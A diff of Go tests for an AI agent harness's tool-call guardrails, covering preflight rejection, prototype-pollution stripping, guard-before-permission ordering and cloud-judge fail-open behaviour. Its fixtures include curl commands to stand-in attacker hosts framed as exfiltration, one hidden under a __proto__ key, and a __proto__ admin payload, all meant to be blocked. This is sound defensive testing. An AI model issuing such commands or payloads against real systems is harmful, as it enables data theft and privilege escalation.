@@ -11,6 +11,9 @@ import (
 	"sync"
 	"testing"
 
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
+
 	"github.com/rxbynerd/stirrup/harness/internal/guard"
 	"github.com/rxbynerd/stirrup/harness/internal/observability"
 	"github.com/rxbynerd/stirrup/harness/internal/permission"
@@ -62,9 +65,7 @@ func securityEventNames(t *testing.T, buf *bytes.Buffer) []string {
 		var line struct {
 			Event string `json:"event"`
 		}
-		if err := json.Unmarshal(sc.Bytes(), &line); err != nil {
-			t.Fatalf("security log line is not JSON: %q: %v", sc.Text(), err)
-		}
+		require.NoError(t, json.Unmarshal(sc.Bytes(), &line), "security log line is not JSON: %q", sc.Text())
 		names = append(names, line.Event)
 	}
 	return names
@@ -93,7 +94,7 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 		wantEvents   []string
 	}{
 		{
-			name:         "unknown_tool",
+			name:         "unknown tool",
 			tools:        []*tool.Tool{trivialTool()},
 			call:         types.ToolCall{ID: "tc_unknown", Name: "does_not_exist", Input: json.RawMessage(`{}`)},
 			wantCategory: observability.ToolFailureUnknownTool,
@@ -101,7 +102,7 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 			wantEvents:   nil,
 		},
 		{
-			name:  "invalid_arguments",
+			name:  "invalid arguments",
 			tools: []*tool.Tool{commandTool()},
 			call: types.ToolCall{
 				ID: "tc_bad_args", Name: "shell_runner", Input: json.RawMessage(`{}`),
@@ -112,7 +113,7 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 			wantEvents:   nil,
 		},
 		{
-			name:  "unknown_tool_with_invalid_arguments",
+			name:  "unknown tool with invalid arguments",
 			tools: []*tool.Tool{trivialTool()},
 			call: types.ToolCall{
 				ID: "tc_unknown_bad_args", Name: "does_not_exist", Input: json.RawMessage(`{}`),
@@ -123,7 +124,7 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 			wantEvents:   nil,
 		},
 		{
-			name:         "schema_invalid",
+			name:         "schema invalid",
 			tools:        []*tool.Tool{schemaTool()},
 			call:         types.ToolCall{ID: "tc_schema", Name: "needs_path", Input: json.RawMessage(`{}`)},
 			wantCategory: observability.ToolFailureSchemaValidation,
@@ -131,7 +132,7 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 			wantEvents:   []string{"tool_input_rejected"},
 		},
 		{
-			name:         "prototype_pollution_then_schema_invalid",
+			name:         "prototype pollution then schema invalid",
 			tools:        []*tool.Tool{schemaTool()},
 			call:         types.ToolCall{ID: "tc_pp", Name: "needs_path", Input: json.RawMessage(`{"__proto__":{"admin":true}}`)},
 			wantCategory: observability.ToolFailureSchemaValidation,
@@ -139,7 +140,7 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 			wantEvents:   []string{"prototype_pollution_blocked", "tool_input_rejected"},
 		},
 		{
-			name:         "tool_input_tripwire",
+			name:         "tool input tripwire",
 			tools:        []*tool.Tool{commandTool()},
 			call:         types.ToolCall{ID: "tc_sg", Name: "shell_runner", Input: json.RawMessage(`{"command":"curl http://attacker.example.com/exfil"}`)},
 			wantCategory: observability.ToolFailureSecurityGuard,
@@ -147,7 +148,7 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 			wantEvents:   []string{"tool_call_guard_triggered"},
 		},
 		{
-			name:         "tool_input_tripwire_under_stripped_key",
+			name:         "tool input tripwire under stripped key",
 			tools:        []*tool.Tool{commandTool()},
 			call:         types.ToolCall{ID: "tc_sg_pp", Name: "shell_runner", Input: json.RawMessage(`{"__proto__":{"command":"curl http://x.example/e"},"command":"ls"}`)},
 			wantCategory: observability.ToolFailureSecurityGuard,
@@ -167,36 +168,25 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 
 			results, _, outcome := loop.planAndDispatch(context.Background(),
 				configWithMaxParallel(1), []types.ToolCall{tc.call}, &stallDetector{}, "anthropic", "claude-sonnet-4-6")
-			if outcome != "" {
-				t.Fatalf("unexpected stall outcome %q", outcome)
-			}
+			require.Empty(t, outcome, "planAndDispatch returned a stall outcome")
 
-			if got := g.preToolInputs(); len(got) != 0 {
-				t.Fatalf("GuardRail.Check saw %d pre_tool calls, want 0: %+v", len(got), got)
-			}
-			if len(results) != 1 || !results[0].IsError {
-				t.Fatalf("want one IsError result, got %+v", results)
-			}
-			if !strings.HasPrefix(results[0].Content, tc.wantOutput) {
-				t.Errorf("result content = %q, want prefix %q", results[0].Content, tc.wantOutput)
-			}
+			require.Empty(t, g.preToolInputs(), "GuardRail.Check classified a rejected call")
+			require.Len(t, results, 1)
+			require.True(t, results[0].IsError, "result = %+v", results)
+			require.Truef(t, strings.HasPrefix(results[0].Content, tc.wantOutput),
+				"result content = %q, want prefix %q", results[0].Content, tc.wantOutput)
 
 			failures := collectFailures(t, reader)
-			if len(failures) != 1 || failures[0].category != tc.wantCategory.String() {
-				t.Fatalf("tool_failures = %+v, want one %q observation", failures, tc.wantCategory)
-			}
+			require.Len(t, failures, 1, "tool_failures = %+v", failures)
+			require.Equal(t, tc.wantCategory.String(), failures[0].category)
+
 			_, calls := rec.snapshot()
-			if len(calls) != 1 || calls[0].ErrorCategory != tc.wantCategory.String() {
-				t.Fatalf("trace tool calls = %+v, want ErrorCategory %q", calls, tc.wantCategory)
-			}
+			require.Len(t, calls, 1, "trace tool calls = %+v", calls)
+			require.Equal(t, tc.wantCategory.String(), calls[0].ErrorCategory)
 
 			events := securityEventNames(t, &secBuf)
-			if hasGuardEvent(events) {
-				t.Errorf("guard event emitted for a preflight rejection: %v", events)
-			}
-			if strings.Join(events, ",") != strings.Join(tc.wantEvents, ",") {
-				t.Errorf("security events = %v, want %v", events, tc.wantEvents)
-			}
+			require.False(t, hasGuardEvent(events), "guard event emitted for a preflight rejection: %v", events)
+			require.Equal(t, tc.wantEvents, events)
 		})
 	}
 }
@@ -227,40 +217,32 @@ func TestPlanAndDispatch_PreToolGuardClassifiesCleanedInput(t *testing.T) {
 	}
 	results, _, _ := loop.planAndDispatch(context.Background(),
 		configWithMaxParallel(1), []types.ToolCall{call}, &stallDetector{}, "", "")
-	if len(results) != 1 || results[0].IsError {
-		t.Fatalf("want one successful result, got %+v", results)
-	}
+	require.Len(t, results, 1)
+	require.False(t, results[0].IsError, "result = %+v", results)
 
 	seen := g.preToolInputs()
-	if len(seen) != 1 {
-		t.Fatalf("pre_tool guard calls = %d, want 1", len(seen))
-	}
+	require.Len(t, seen, 1, "pre_tool guard calls")
 	in := seen[0]
 	for _, field := range []struct {
 		name  string
 		value string
 	}{
-		{"Content", in.Content},
-		{"ToolInput", string(in.ToolInput)},
+		{"guard content", in.Content},
+		{"guard tool input", string(in.ToolInput)},
 	} {
-		if strings.Contains(field.value, "__proto__") || strings.Contains(field.value, "constructor") {
-			t.Errorf("guard %s carries stripped keys: %s", field.name, field.value)
-		}
-		if !strings.Contains(field.value, `"safe":"v"`) {
-			t.Errorf("guard %s lost the safe key: %s", field.name, field.value)
-		}
+		t.Run(field.name, func(t *testing.T) {
+			require.NotContains(t, field.value, "__proto__", "stripped key reached the guard")
+			require.NotContains(t, field.value, "constructor", "stripped key reached the guard")
+			require.Contains(t, field.value, `"safe":"v"`, "safe key missing from the guard input")
+		})
 	}
-	if in.Content != string(handlerInput) {
-		t.Errorf("guard Content %q differs from handler input %q", in.Content, handlerInput)
-	}
-	if in.ToolName != "permissive" || in.Source != "tool_call:permissive" {
-		t.Errorf("guard ToolName/Source = %q/%q, want permissive/tool_call:permissive", in.ToolName, in.Source)
-	}
+	assert.Equal(t, string(handlerInput), in.Content, "guard content should match the handler input")
+	assert.Equal(t, "permissive", in.ToolName)
+	assert.Equal(t, "tool_call:permissive", in.Source)
 
 	events := securityEventNames(t, &secBuf)
-	if len(events) < 2 || events[0] != "prototype_pollution_blocked" || events[1] != "guard_allowed" {
-		t.Errorf("security events = %v, want prototype_pollution_blocked then guard_allowed", events)
-	}
+	require.GreaterOrEqual(t, len(events), 2, "security events = %v", events)
+	assert.Equal(t, []string{"prototype_pollution_blocked", "guard_allowed"}, events[:2])
 }
 
 // TestPlanAndDispatch_PreToolGuardDenyOutcome pins the deny path for a
@@ -285,26 +267,22 @@ func TestPlanAndDispatch_PreToolGuardDenyOutcome(t *testing.T) {
 		[]types.ToolCall{{ID: "tc_deny", Name: "trivial", Input: json.RawMessage(`{}`)}},
 		&stallDetector{}, "", "")
 
-	if len(g.preToolInputs()) != 1 {
-		t.Fatalf("pre_tool guard calls = %d, want 1", len(g.preToolInputs()))
-	}
-	if handlerCalls != 0 {
-		t.Errorf("handler ran %d times after a guard deny", handlerCalls)
-	}
-	if len(results) != 1 || !results[0].IsError || results[0].Content != "guardrail blocked tool call" {
-		t.Fatalf("result = %+v, want IsError with fixed guard text", results)
-	}
+	require.Len(t, g.preToolInputs(), 1, "pre_tool guard calls")
+	assert.Zero(t, handlerCalls, "handler ran after a guard deny")
+	require.Len(t, results, 1)
+	require.True(t, results[0].IsError, "result = %+v", results)
+	require.Equal(t, "guardrail blocked tool call", results[0].Content)
+
 	failures := collectFailures(t, reader)
-	if len(failures) != 1 || failures[0].category != observability.ToolFailureGuardrailDenied.String() {
-		t.Errorf("tool_failures = %+v, want one guardrail_denied observation", failures)
-	}
+	require.Len(t, failures, 1, "tool_failures = %+v", failures)
+	require.Equal(t, observability.ToolFailureGuardrailDenied.String(), failures[0].category)
+
 	_, calls := rec.snapshot()
-	if len(calls) != 1 || calls[0].ErrorReason != "guardrail blocked tool call: classifier said no" {
-		t.Errorf("trace tool calls = %+v, want guard deny reason", calls)
-	}
-	if events := securityEventNames(t, &secBuf); strings.Join(events, ",") != "guard_denied" {
-		t.Errorf("security events = %v, want [guard_denied]", events)
-	}
+	require.Len(t, calls, 1, "trace tool calls = %+v", calls)
+	require.Equal(t, "guardrail blocked tool call: classifier said no", calls[0].ErrorReason)
+
+	events := securityEventNames(t, &secBuf)
+	require.Equal(t, []string{"guard_denied"}, events)
 }
 
 // TestLoop_SchemaInvalidToolCallNeverReachesPreToolGuard drives a full run:
@@ -336,25 +314,16 @@ func TestLoop_SchemaInvalidToolCallNeverReachesPreToolGuard(t *testing.T) {
 	config := buildTestConfig()
 	config.MaxTurns = 4
 
-	if _, err := loop.Run(context.Background(), config); err != nil {
-		t.Fatalf("Run() error: %v", err)
-	}
-	if scripted.turn != 2 {
-		t.Errorf("provider turns = %d, want 2 (the run continues after the tool failure)", scripted.turn)
-	}
-	if got := g.preToolInputs(); len(got) != 0 {
-		t.Errorf("pre_tool guard calls = %d, want 0: %+v", len(got), got)
-	}
-	if g.otherPhases == 0 {
-		t.Error("guard saw no pre_turn/post_turn calls; the test is not exercising a wired guard")
-	}
+	_, err := loop.Run(context.Background(), config)
+	require.NoError(t, err)
+	assert.Equal(t, 2, scripted.turn, "provider turns (the run continues after the tool failure)")
+	assert.Empty(t, g.preToolInputs(), "pre_tool guard calls")
+	assert.NotZero(t, g.otherPhases, "guard saw no pre_turn/post_turn calls; the test is not exercising a wired guard")
+
 	_, calls := rec.snapshot()
-	if len(calls) != 1 {
-		t.Fatalf("recorded tool calls = %d, want 1", len(calls))
-	}
-	if calls[0].Success || calls[0].ErrorCategory != observability.ToolFailureSchemaValidation.String() {
-		t.Errorf("tool call trace = %+v, want failed schema_validation_failed", calls[0])
-	}
+	require.Len(t, calls, 1, "recorded tool calls")
+	assert.False(t, calls[0].Success, "tool call trace should record a failure")
+	assert.Equal(t, observability.ToolFailureSchemaValidation.String(), calls[0].ErrorCategory)
 }
 
 // gateOrder records the gating surfaces a call reached, in order.
@@ -406,8 +375,8 @@ func TestPlanAndDispatch_PreToolGuardRunsBeforePermission(t *testing.T) {
 		name string
 		new  func() *tool.Tool
 	}{
-		{"workspace_mutating", mutatingTool},
-		{"requires_approval", func() *tool.Tool {
+		{"workspace mutating", mutatingTool},
+		{"requires approval", func() *tool.Tool {
 			tl := trivialTool()
 			tl.RequiresApproval = true
 			return tl
@@ -420,9 +389,9 @@ func TestPlanAndDispatch_PreToolGuardRunsBeforePermission(t *testing.T) {
 		wantOrder    string
 		wantCategory observability.ToolFailureCategory
 	}{
-		{"guard_deny", guard.VerdictDeny, true, "guard", observability.ToolFailureGuardrailDenied},
-		{"guard_allow_permission_allow", guard.VerdictAllow, true, "guard,permission", ""},
-		{"guard_allow_permission_deny", guard.VerdictAllow, false, "guard,permission", observability.ToolFailurePermissionDenied},
+		{"guard deny", guard.VerdictDeny, true, "guard", observability.ToolFailureGuardrailDenied},
+		{"guard allow permission allow", guard.VerdictAllow, true, "guard,permission", ""},
+		{"guard allow permission deny", guard.VerdictAllow, false, "guard,permission", observability.ToolFailurePermissionDenied},
 	}
 	for _, gt := range gatedTools {
 		for _, tc := range cases {
@@ -442,23 +411,19 @@ func TestPlanAndDispatch_PreToolGuardRunsBeforePermission(t *testing.T) {
 					[]types.ToolCall{{ID: "tc_gate", Name: tl.Name, Input: json.RawMessage(`{}`)}},
 					&stallDetector{}, "", "")
 
-				if got := order.String(); got != tc.wantOrder {
-					t.Errorf("gate order = %q, want %q", got, tc.wantOrder)
-				}
+				require.Equal(t, tc.wantOrder, order.String(), "gate order")
 				wantRan := tc.wantCategory == ""
-				if ran := handlerCalls == 1; ran != wantRan {
-					t.Errorf("handler ran %d times, want ran=%v", handlerCalls, wantRan)
-				}
-				if len(results) != 1 || results[0].IsError == wantRan {
-					t.Fatalf("results = %+v, want one result with IsError=%v", results, !wantRan)
-				}
+				require.Equal(t, wantRan, handlerCalls == 1, "handler ran %d times", handlerCalls)
+				require.Len(t, results, 1)
+				require.Equal(t, !wantRan, results[0].IsError, "results = %+v", results)
+
 				failures := collectFailures(t, reader)
-				switch {
-				case wantRan && len(failures) != 0:
-					t.Errorf("tool_failures = %+v, want none", failures)
-				case !wantRan && (len(failures) != 1 || failures[0].category != tc.wantCategory.String()):
-					t.Errorf("tool_failures = %+v, want one %q", failures, tc.wantCategory)
+				if wantRan {
+					require.Empty(t, failures, "tool_failures")
+					return
 				}
+				require.Len(t, failures, 1, "tool_failures = %+v", failures)
+				require.Equal(t, tc.wantCategory.String(), failures[0].category)
 			})
 		}
 	}
@@ -497,16 +462,11 @@ func TestPlanAndDispatch_AsyncToolReceivesGuardedInput(t *testing.T) {
 				[]types.ToolCall{call}, &stallDetector{}, "", "")
 
 			seen := g.preToolInputs()
-			if len(seen) != 1 {
-				t.Fatalf("pre_tool guard calls = %d, want 1", len(seen))
-			}
+			require.Len(t, seen, 1, "pre_tool guard calls")
 			guarded := seen[0].Content
-			if strings.Contains(guarded, "__proto__") || !strings.Contains(guarded, `"path":"x"`) {
-				t.Fatalf("guard Content = %s, want the stripped input", guarded)
-			}
-			if string(seen[0].ToolInput) != guarded {
-				t.Errorf("guard ToolInput %s differs from Content %s", seen[0].ToolInput, guarded)
-			}
+			require.NotContains(t, guarded, "__proto__", "guard content should drop the stripped key")
+			require.Contains(t, guarded, `"path":"x"`, "guard content should keep the path key")
+			require.Equal(t, guarded, string(seen[0].ToolInput), "guard ToolInput should match Content")
 
 			var requests []types.HarnessEvent
 			for _, e := range tr.Events() {
@@ -519,23 +479,18 @@ func TestPlanAndDispatch_AsyncToolReceivesGuardedInput(t *testing.T) {
 			mu.Unlock()
 
 			if verdict == guard.VerdictDeny {
-				if len(inputs) != 0 || len(requests) != 0 {
-					t.Errorf("guard deny reached the async path: handler inputs %v, requests %+v", inputs, requests)
-				}
-				if len(results) != 1 || !results[0].IsError {
-					t.Errorf("results = %+v, want one IsError result", results)
-				}
+				require.Empty(t, inputs, "guard deny reached AsyncHandler")
+				require.Empty(t, requests, "guard deny emitted a tool_result_request")
+				require.Len(t, results, 1)
+				require.True(t, results[0].IsError, "results = %+v", results)
 				return
 			}
-			if len(results) != 1 || results[0].IsError || results[0].Content != "async-ok" {
-				t.Fatalf("results = %+v, want one async-ok result", results)
-			}
-			if len(inputs) != 1 || inputs[0] != guarded {
-				t.Errorf("AsyncHandler inputs = %v, want [%s]", inputs, guarded)
-			}
-			if len(requests) != 1 || string(requests[0].Input) != guarded {
-				t.Errorf("tool_result_request inputs = %+v, want one carrying %s", requests, guarded)
-			}
+			require.Len(t, results, 1)
+			require.False(t, results[0].IsError, "results = %+v", results)
+			require.Equal(t, "async-ok", results[0].Content)
+			require.Equal(t, []string{guarded}, inputs, "AsyncHandler inputs")
+			require.Len(t, requests, 1, "tool_result_request events")
+			require.Equal(t, guarded, string(requests[0].Input))
 		})
 	}
 }
@@ -578,19 +533,17 @@ func TestPlanAndDispatch_CloudJudgeIncompleteStreamFollowsFailOpen(t *testing.T)
 		wantRan    bool
 		wantErrEvt bool
 	}{
-		{"end_turn_allow", "allow", "end_turn", false, true, false},
-		{"end_turn_deny_failOpen", "deny", "end_turn", true, false, false},
-		{"max_tokens_allow", "allow", "max_tokens", false, false, true},
-		{"max_tokens_allow_failOpen", "allow", "max_tokens", true, true, true},
+		{"end turn allow", "allow", "end_turn", false, true, false},
+		{"end turn deny fail open", "deny", "end_turn", true, false, false},
+		{"max tokens allow", "allow", "max_tokens", false, false, true},
+		{"max tokens allow fail open", "allow", "max_tokens", true, true, true},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
 			cj, err := guard.NewCloudJudge(guard.CloudJudgeConfig{
 				Provider: &nonceEchoJudgeProvider{verdict: tc.verdict, stopReason: tc.stopReason},
 			})
-			if err != nil {
-				t.Fatalf("NewCloudJudge: %v", err)
-			}
+			require.NoError(t, err, "NewCloudJudge")
 			handlerCalls := 0
 			tl := trivialTool()
 			tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
@@ -607,18 +560,14 @@ func TestPlanAndDispatch_CloudJudgeIncompleteStreamFollowsFailOpen(t *testing.T)
 				[]types.ToolCall{{ID: "tc_cj", Name: "trivial", Input: json.RawMessage(`{}`)}},
 				&stallDetector{}, "", "")
 
-			if ran := handlerCalls == 1; ran != tc.wantRan {
-				t.Fatalf("handler ran %d times, want ran=%v; results %+v", handlerCalls, tc.wantRan, results)
-			}
+			require.Equal(t, tc.wantRan, handlerCalls == 1, "handler ran %d times; results %+v", handlerCalls, results)
 			if !tc.wantRan {
 				failures := collectFailures(t, reader)
-				if len(failures) != 1 || failures[0].category != observability.ToolFailureGuardrailDenied.String() {
-					t.Errorf("tool_failures = %+v, want one guardrail_denied", failures)
-				}
+				require.Len(t, failures, 1, "tool_failures = %+v", failures)
+				require.Equal(t, observability.ToolFailureGuardrailDenied.String(), failures[0].category)
 			}
-			if got := strings.Contains(secBuf.String(), `"guard_error"`); got != tc.wantErrEvt {
-				t.Errorf("guard_error event present = %v, want %v: %s", got, tc.wantErrEvt, secBuf.String())
-			}
+			require.Equal(t, tc.wantErrEvt, strings.Contains(secBuf.String(), `"guard_error"`),
+				"security log: %s", secBuf.String())
 		})
 	}
 }
